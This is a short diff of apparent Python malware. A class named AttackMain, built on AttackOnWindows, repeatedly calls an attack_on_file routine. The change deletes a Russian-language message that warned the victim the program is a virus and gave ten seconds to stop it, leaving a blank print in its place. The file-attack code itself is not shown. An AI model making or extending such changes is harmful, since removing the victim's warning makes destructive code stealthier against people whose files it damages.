@@ -62,8 +62,7 @@ def main():
     class AttackMain(AttackOnWindows):
         def attack_main_all_system(self, start):
             while start:
-                print('Это программа вирусная , у тебя 10 сек '
-                      'чтобы выключить ее ')
+                print(' ')
                 time.sleep(10)
                 self.attack_on_file()
 
